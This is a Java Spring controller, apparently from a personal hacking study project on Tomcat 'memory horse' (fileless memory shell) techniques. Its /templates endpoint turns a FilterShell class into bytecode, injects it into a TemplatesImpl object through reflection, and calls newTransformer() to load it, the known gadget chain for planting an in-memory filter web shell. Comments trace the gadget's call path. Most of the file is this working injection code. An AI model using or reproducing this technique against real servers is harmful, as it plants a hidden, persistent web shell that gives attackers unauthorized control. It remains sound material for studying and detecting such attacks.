package com.xjjlearning.hack.tomcat.memoryhorse.memoryhorse.controller;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.xjjlearning.hack.tomcat.memoryhorse.memoryhorse.evilclass.FilterShell;
import com.xjjlearning.hack.utils.ClassUtil;
import com.xjjlearning.hack.utils.ReflectionUtil;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServlet;

/**
 * Created by xjj on 2023/7/14.
 */
@RestController
public class TemplatesImplController extends HttpServlet {
    @RequestMapping("/templates")
    public void TemplatesImpl() throws Exception {
        //        ApplicationFilterChain
        /**
         * 1.
         * getTransletClasses():  _class == null ->
         * /getTransletIndex(): _class == null ->
         * /getOutputProperties() -> newTransformer() -> getTransletInstance(): _name != null && _class == null ->
         *
         */

        // 2.defineTransletClasses() -> defineClass()

        class TFactory extends TransformerFactoryImpl {}

        byte[] code = ClassUtil.classAsBytes(FilterShell.class);

        TemplatesImpl templates = new TemplatesImpl();
        ReflectionUtil.setFieldValue(templates, "_name", "");
        ReflectionUtil.setFieldValue(templates, "_bytecodes", new byte[][]{code});
        ReflectionUtil.setFieldValue(templates, "_tfactory", new TFactory());

        templates.newTransformer();
    }

}
